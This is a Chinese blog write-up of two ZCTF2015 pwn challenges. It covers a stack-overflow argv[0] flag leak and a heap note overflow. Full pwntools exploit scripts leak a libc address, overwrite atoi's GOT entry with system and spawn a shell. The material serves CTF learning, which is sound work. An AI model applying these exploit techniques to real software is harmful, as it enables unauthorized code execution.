---
title: ZCTF2015 pwn
tags:
  - PWN
  - writeup
categories: []
date: 2017-02-17 17:59:16
---

整理了一下ZCTF2015的pwn，看看出题思路。。

## guess 100

这个应该时之前ctftime上的一个比赛的题，应该时zctf借鉴的。。我觉得这次也很有可能会出之前比赛的题目

```
pwndbg> checksec 
[*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn1/guess'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE

```

有canary，但是有栈溢出，栈溢出后`__stack_check_fail`会打印程序的名字，也就是`argv[0]`的值，我们溢出修改`argv[0]`的值为之前加载到内存的`flag`的地址即可。
[相关的ppt](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)

断点在`fgets(&::s, v8 + 1, stream);`，也就是`.text:0000000000400A61                 call    _fgets`前

```
    fseek(stream, 0LL, 0);
    fgets(&::s, v8 + 1, stream);
    fclose(stream);
```

gdb查看得到加载的地址

```
pwndbg> pd
 ► 0x400a61    call   fgets@plt                     <0x400800>
        s: 0x6010c0 ◂— 0x0
        n: 0x24
        stream: 0x602010 ◂— 0xfbad2488
 
   0x400a66    mov    rax, qword ptr [rbp - 0x48]
   0x400a6a    mov    rdi, rax
   0x400a6d    call   fclose@plt                    <0x4007a0>

```

exp如下，第一个用于获取`flag`长度，第二个用于攻击：

```
from pwn import *
 
 if __name__ == '__main__':
     for i in range(40):
         payload = i *'a'
         p = process('./guess')
         print p.recvuntil('\n')
         p.sendline(payload)
         result = p.recvuntil('\n')
         if 'ZCTF' in result:
             print 'len=', i
             p.close()
			 break
         p.close()
```

```
from pwn import *
 context.log_level = 'debug'
 
 s = process('./guess')
 s.recvuntil('please guess the flag:')
 payload='ZCTF{'+'A'*(32-5) + '\x00' + 'a'*263 + p64(0x6010C5)
 s.sendline(payload)
 s.recvuntil('***: ')
 flagt = s.recvuntil('\n')[:27]
 flag  = 'ZCTF{'
 for i in flagt:
     flag += chr(ord(i)^ord('A'))
 print flag
 s.close()
```

## note1 200

checksec

```
pwndbg> checksec 
[*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn2/note1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

看了下程序，edit可以溢出修改到下一个note的指针，输出got表里puts的地址，因为这里的content是偏移了0x70位的，所以要减去0x70。最后修改atoi为system，输入/bin/sh

但是有一个地方不明白，got表的高8byte是什么？

```
0x602018 <puts@got.plt>:	0x00007ffff7a7d690	0x0000000000400706
0x602028 <printf@got.plt>:	0x00007ffff7a63800	0x00007ffff7ad9650
0x602038 <read@got.plt>:	0x00007ffff7b04670	0x00007ffff7a2e740
0x602048 <strcmp@got.plt>:	0x00007ffff7aac9c0	0x0000000000400766
0x602058 <malloc@got.plt>:	0x00007ffff7a91580	0x00007ffff7a7de70
0x602068 <atoi@got.plt>:	0x00007ffff7a44e80	0x00000000004007a6
```

exp:

```
from pwn import *

DEBUG = 0
if DEBUG:
    context.log_level = 'debug'

elf = ELF('./note1')
libc = ELF('libc.so.6')

atoi_got = elf.got['atoi']
puts_got = elf.got['puts']
puts_off = libc.symbols['puts']
read_off = libc.symbols['read']
system_off = libc.symbols['system']

p = process('./note1')
def new(title, types, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(title)
    p.recvuntil(':')
    p.sendline(types)
    p.recvuntil(':')
    p.sendline(content)
    return

def editnote(title,content):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(title)
    p.recvuntil(':')
    p.sendline(content)
    return

def shownote():
    p.recvuntil('option--->>\n')
    p.sendline('2')
    return

def main():
    payload = (0x100 + 0x10)*'a'+p64(0)+p64(puts_got - 0x70)+'b'
    new('a', 'aa', 'aaa')
    new('b', 'bb', 'bbb')
    editnote('a', payload)
    shownote()
    p.recvuntil('\n')
    p.recvuntil('content=')
    buf = p.recvuntil('\n')[:-1] + '\x00\x00'
    puts = u64(buf)
    print puts
    libc_base = puts - puts_off
    log.success('Libc base = ' + hex(libc_base))
    read = libc_base + read_off
    system = libc_base + system_off
    new_got = p64(puts) + 'a'*24+p64(read)+'a'*40+p64(system)
    editnote('',new_got)
    p.sendline('/bin/sh')
    p.interactive()
    return 0

if __name__ == '__main__':
    main()
```